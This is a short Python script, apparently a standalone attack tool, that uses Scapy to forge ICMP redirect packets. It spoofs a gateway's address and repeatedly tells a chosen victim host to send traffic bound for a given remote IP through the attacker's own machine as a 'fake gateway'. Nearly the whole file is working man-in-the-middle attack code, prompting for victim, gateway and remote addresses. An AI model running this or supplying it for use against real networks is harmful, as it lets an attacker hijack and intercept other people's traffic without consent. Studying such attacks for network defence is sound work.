#!/usr/bin/env python3
# target here should be the foreign network you want to send a routing upadte for, not victim IP

from scapy.all import *
import socket    

class icmp_redirect:
    def execute():
        victim_ip= input("Enter Victim IP: ")
        gw_ip= input("Enter Gateway IP: ")
        # IP address to redirect traffic for, as in redirect traffic from the client bound for the redirect IP below
        remote_ip = input("Enter Remote IP to fake route to: ")
        # my local address
        hostname = socket.gethostname()    
        local_ip = socket.gethostbyname(hostname)   
        print("Localhost IP (fake gateway) is :", local_ip)

        try:
            print ("Start redirect...")
            ip = IP();
            ip.src = gw_ip;
            ip.dst = victim_ip;
            ip.display
            icmp = ICMP();
            icmp.type = 5;
            icmp.code = 1;
            icmp.gw = local_ip
            icmp.display
            ip2 = IP();
            ip2.src = victim_ip;
            ip2.dst = remote_ip
            ip2.display
            send(ip/icmp/ip2/UDP(), loop=1, inter=2, verbose=True);
        except KeyboardInterrupt:
            print ("Ended redirect")
            input("Press any key to continue...")